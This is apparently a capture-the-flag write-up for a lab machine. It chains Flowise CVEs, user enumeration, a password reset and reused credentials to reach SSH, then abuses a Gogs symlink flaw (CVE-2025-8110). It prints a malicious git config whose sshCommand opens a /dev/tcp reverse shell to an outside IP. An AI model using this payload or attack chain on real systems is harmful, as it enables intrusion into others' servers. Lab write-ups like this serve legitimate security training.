- 22 ssh
- 80 http

we have some static content and a calculator for loan rates. no interesting functionality

with ffuf subdomain scan we can find staging.silentium.htb

on this domain they are running flowise "build ai agents visually" (version 3.0.5)

this ai shit is riddled with bugs, some good ones are:
- [CVE-2026-30821](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-j8g8-j7fc-43v6) (unrestricted file upload)
- [CVE-2025-59528](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p) (RCE)

however most of these exploits require authentication, so...

we can also easily enumerate users either via the forgot password page or signin page, guessing around I found ben@silentium.htb exists (name on leadership page)

now lets change ben's password

get the api key from the ui, and now we can launch our rce:

  -H "Content-Type: application/json" \

we land inside a docker container

we can find the mounted vol at /root/.flowise, also [look at the default compose](https://github.com/FlowiseAI/Flowise/blob/main/docker/docker-compose.yml)

in there is an encryption.key, but that's just generated by flowise

we can also look through the sqlite database, but can't really find anything of use

so how do we get out of this container? first obvious thing is check the env vars, and we find a couple of the passwords that were set for the container like `SMTP_PASSWORD` and `FLOWISE_PASSWORD`

testing the passwords for ssh as user ben (guessed based on our knowledge) reveals that the `SMTP_PASSWORD` is the one that's reused

do our basic privesc checks, during enumeration of the locally running services we find Gogs (git service) running http server on 3001, also mailhog, and some http api

we can also read the gogs app.ini

`ssh -L 3001:localhost:3001 ben@silentium.htb`

there is a 'ben' user already existing, and we can create our own user too. researching recent cves for gogs there is an RCE which involves [bypassing a previous patch via symlink to overwrite arbitrary files](https://www.wiz.io/blog/wiz-research-gogs-cve-2025-8110-rce-exploit)

all it entails is making a repo with a symlink to `.git/config` and using the file contents api to put data overwriting the sshCommand to be whatever we want

after creating repo, cloning, and committing our symlink, we construct our config

```
[core]
  repositoryformatversion = 0
  filemode = true
  bare = false
  logallrefupdates = true
  ignorecase = true
  precomposeunicode = true
  sshCommand = bash -c 'bash -i >& /dev/tcp/10.10.15.59/1337 0>&1' #
[remote "origin"]
  url = git@localhost:gogs/pwn.git
  fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
  remote = origin
  merge = refs/heads/master
```

(generate a token in the ui)
